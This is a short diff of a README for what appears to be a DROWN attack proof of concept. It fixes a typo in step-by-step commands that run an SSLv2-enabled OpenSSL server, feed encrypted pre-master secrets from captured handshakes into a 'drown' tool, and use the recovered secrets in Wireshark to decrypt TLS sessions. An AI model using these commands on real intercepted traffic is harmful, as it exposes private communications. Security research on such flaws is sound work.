@@ -53,7 +53,8 @@ To decrypt these handshakes, we need an OpenSSL server accepting SSLv2 connectio
 
     ./bin/openssl s_server -cert cert.pem -key key.pem -accept 4434 -www -ssl2
 
-We can now decrypt the encrypted pre-master secrest : 
+We can now decrypt the encrypted pre-master secret : 
+
     tshark -r handshakes.cap -d tcp.port==4433,ssl -T fields -e ssl.handshake.epms -Y ssl.handshake.epms | tr -d : | ./drown localhost:4434 cert.pem > pms.txt
 
 After some time and if we're lucky, we will have some results in pms.txt. You can use this file in Wireshark to decrypt the content of the TLS session (Protocol Preferences > SSL > (Pre)-Master-Secret log filename).
